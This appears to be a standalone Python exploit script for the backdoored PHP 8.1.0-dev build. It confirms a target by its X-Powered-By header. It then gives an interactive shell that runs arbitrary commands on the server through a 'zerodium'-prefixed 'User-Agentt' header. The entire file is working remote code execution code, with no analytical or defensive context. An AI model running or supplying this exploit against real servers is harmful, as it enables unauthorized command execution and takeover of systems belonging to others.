#!/usr/bin/env python3
import requests
import sys
import re
import cmd

global url

def check_target(url):
    resp = requests.get(url)
    if resp.headers['X-Powered-By'] == 'PHP/8.1.0-dev':
        return True
    else:
        return False


class ZerodiumRCE(cmd.Cmd):
    prompt = 'zerodium $ '

    def default(self, line):
        pattern = re.compile("<.*html.*>")
        payload = {
            'User-Agentt': f'zerodiumsystem(\'{line}\');'
        }
        resp = requests.get(url, headers=payload)
        output = pattern.split(resp.text)[0]
        print(output.strip())


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip('/')
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s http://example.com/" % sys.argv[0])
        sys.exit(-1)

    if check_target(url):
        try:
            ZerodiumRCE().cmdloop()
        except KeyboardInterrupt:
            print('\n[!] Interrupted')
            sys.exit(-1)
    else:
        print("[-] Target is not vulnerable")
        sys.exit(-1)
